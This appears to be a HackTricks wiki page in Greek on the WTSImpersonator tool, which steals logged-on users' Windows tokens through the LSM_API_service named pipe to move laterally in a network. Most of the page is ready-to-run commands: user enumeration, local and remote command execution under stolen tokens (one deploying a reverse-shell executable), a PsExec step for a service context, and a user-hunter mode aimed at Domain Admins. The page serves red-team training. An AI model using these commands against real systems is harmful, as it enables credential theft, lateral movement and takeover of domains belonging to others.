{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Το εργαλείο **WTS Impersonator** εκμεταλλεύεται τον **"\\pipe\LSM_API_service"** RPC Named pipe για να καταγράψει κρυφά τους συνδεδεμένους χρήστες και να κλέψει τα tokens τους, παρακάμπτοντας τις παραδοσιακές τεχνικές Token Impersonation. Αυτή η προσέγγιση διευκολύνει τις ομαλές πλευρικές κινήσεις εντός των δικτύων. Η καινοτομία πίσω από αυτή την τεχνική αποδίδεται στον **Omri Baso, του οποίου το έργο είναι προσβάσιμο στο [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Κύρια Λειτουργικότητα
Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage
- **Αναγνώριση Χρηστών**: Η τοπική και απομακρυσμένη αναγνώριση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:
- Τοπικά:
```powershell
.\WTSImpersonator.exe -m enum
```
- Απομακρυσμένα, καθορίζοντας μια διεύθυνση IP ή όνομα υπολογιστή:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Εκτέλεση Εντολών**: Τα modules `exec` και `exec-remote` απαιτούν ένα **Service** context για να λειτουργήσουν. Η τοπική εκτέλεση χρειάζεται απλώς το εκτελέσιμο WTSImpersonator και μια εντολή:
- Παράδειγμα για τοπική εκτέλεση εντολής:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για να αποκτήσει ένα service context:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Απομακρυσμένη Εκτέλεση Εντολών**: Περιλαμβάνει τη δημιουργία και εγκατάσταση μιας υπηρεσίας απομακρυσμένα, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με κατάλληλες άδειες.
- Παράδειγμα απομακρυσμένης εκτέλεσης:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module Αναζήτησης Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
- Παράδειγμα χρήσης:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
